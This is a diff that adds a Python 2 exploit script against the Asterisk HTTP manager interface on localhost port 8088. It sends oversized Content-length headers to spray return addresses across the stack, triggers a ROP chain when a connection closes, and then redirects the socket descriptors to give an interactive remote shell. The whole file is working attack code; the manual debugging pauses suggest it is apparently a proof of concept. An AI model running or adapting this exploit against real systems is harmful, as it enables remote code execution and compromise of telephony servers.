@@ -1,0 +1,95 @@
+#!/usr/bin/python
+import socket
+import time
+import sys
+
+SLEEP_TIME = 0.3
+
+def new_conn():
+  time.sleep(SLEEP_TIME)
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect( ("localhost", 8088) )
+  return s
+
+def send_header(s,content_length):
+  time.sleep(SLEEP_TIME)
+  header = ("POST /asterisk/manager HTTP/1.0\r\n"+
+            "Host: localhost\r\n"+
+            "Content-length: "+str(content_length)+"\r\n"+
+            "\r\n")
+  s.send(header)
+
+def send_data(s, data):
+  time.sleep(SLEEP_TIME)
+  s.send(data)
+
+def close_conn(s):
+  time.sleep(SLEEP_TIME)
+  s.close()
+
+def spray_retaddr(offset, data=None):
+  s = new_conn()
+  send_header(s,offset)
+  if data: send_data(s, data)
+  close_conn(s)
+
+def send_cmd(s, cmd):
+  s.settimeout(2)
+  s.send(cmd+'\n')
+  time.sleep(SLEEP_TIME)
+  try:
+    msg = s.recv(4096)
+    print msg
+  except socket.timeout, e:
+    err = e.args[0]
+    # this next if/else is a bit redundant, but illustrates how the
+    # timeout exception is setup
+    if err == 'timed out':
+      print 'recv timed out, retry later'
+    else:
+      print 'e:', e
+  except socket.error, e:
+    print 'socket.error:', e
+
+
+def do_attack():
+  stacksize = 0x7c000
+  rop_offset = 0x3e000 # ~offset(actually buffer size) in stack that will contain the rop chain
+
+  s2 = new_conn() # this gap/stack will be used in repeated connection creation and termination to spray ret addr
+  s1 = new_conn() # used to exec ROP chain
+  close_conn(s2) 
+
+  send_header(s1, rop_offset)
+
+  spray_retaddr(rop_offset + stacksize + 0x020, '\0\0\0\0\0\0\0')
+  spray_retaddr(rop_offset + stacksize - 0x0C0)
+  spray_retaddr(rop_offset + stacksize - 0x110)
+  spray_retaddr(rop_offset + stacksize - 0x170)
+  raw_input("check stack for buffer pointers..")
+  spray_retaddr(rop_offset + stacksize - 0x1A0)
+  raw_input("check if rdi would get buf pointer")
+  spray_retaddr(rop_offset + stacksize - 0x1F0)
+  spray_retaddr(rop_offset + stacksize - 0x290)
+  spray_retaddr(rop_offset + stacksize - 0x2E0)
+  spray_retaddr(rop_offset + stacksize - 0x380)
+
+  raw_input("Check FD of next conn! Press Enter to create conn")
+  s2 = new_conn()
+  raw_input("Check FD of next conn! Check new FD!")
+
+  raw_input("Press Enter to close connection s1 and start executing the rop chain")
+  close_conn(s1)
+
+  send_cmd(s2,"exec 1<&0;exec 2<&1;id")
+
+  cmd = None
+  while True:
+    cmd = raw_input("$ ")
+    if cmd.strip() == "": 
+      continue
+    send_cmd(s2, cmd)
+    if cmd == "quit":
+      break
+
+do_attack()
